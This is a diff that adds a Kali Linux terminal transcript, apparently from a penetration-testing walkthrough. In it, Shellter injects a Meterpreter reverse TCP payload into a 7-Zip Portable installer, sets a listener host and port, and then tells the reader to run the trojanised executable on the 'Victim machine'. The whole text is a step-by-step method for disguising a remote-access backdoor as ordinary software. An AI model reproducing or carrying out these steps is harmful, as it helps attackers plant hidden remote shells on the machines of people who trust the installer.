@@ -1,1 +1,24 @@
+root@kali:~$ shellter
+Choose Operation Mode - Auto/Manual (A/M/H): A
+PE Target: /root/Downloads/7-ZipPortable.exe
+
+************
+* Payloads *
+************
+
+[1] Meterpreter_Reverse_TCP
+[2] Meterpreter_Reverse_HTTP
+[3] Meterpreter_Reverse_HTTPS
+[4] Meterpreter_Bind_TCP
+[5] Shell_Reverse_TCP
+[6] Shell_Bind_TCP
+[7] WinExec
+
+Use a listed payload or custom? (L/C/H): L
+Select payload by index: 1
+SET LHOST: 192.168.1.x
+SET LPORT: 4321
+
+Run the payload on your Victim machine
+C:\7-ZipPortable>7-ZipPortable.exe
 
